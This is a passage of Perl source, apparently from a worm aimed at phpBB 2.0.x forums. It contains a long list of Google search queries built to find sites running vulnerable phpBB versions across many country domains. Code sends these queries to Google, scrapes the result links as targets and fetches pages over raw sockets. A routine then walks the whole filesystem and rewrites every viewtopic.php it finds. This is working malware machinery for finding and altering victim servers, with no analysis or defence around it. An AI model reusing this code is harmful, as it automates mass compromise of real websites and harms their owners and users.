"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.cx%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.cx%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.cx%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.nu%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.nu%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.nu%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.in%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.in%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.in%22+%22phpbb%22%2B%222.0.10%22",
"%22inurl%3A%22.nl%22+%22phpbb%22%2B%222.0.6%22",
"%22inurl%3A%22.nl%22+%22phpbb%22%2B%222.0.8%22",
"%22inurl%3A%22.nl%22+%22phpbb%22%2B%222.0.10%22",
"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.10%22");

    my $query="www.google.com/custom?hl=es&q=";
    $query.=$str[(rand(scalar(@str)))].$rnd;
    $query.="+-modules&num=$n&start=$s";

    my @lst=();
    my $page = http_query($query);
    while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"?>/g){
	if ($1 !~ m/google|cache|translate/){
	    push (@lst,$1);
	}
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
	local $SIG{ALRM} = sub { die "1";};
	alarm 10;
	my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
	print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/4.0\r\n\r\n";
	my @r = <$sock>;
	$page="@r";
	alarm 0;
	close($sock);
    };    
    return $page;

}

sub fix(){
my @in=`find / -name  "viewtopic.php" 2>/dev/null`;
foreach my $f (@in){
    chop $f;
    my $newvt="";
    if (open FIX,"<$f") {
	while (<FIX>){
	    $newvt.=$_;
	}
	close FIX;
	$newvt =~ s/urldecode//;
	if (open FIX,">$f"){
	    print FIX $newvt;
	    close FIX;
	}
    }
}
}
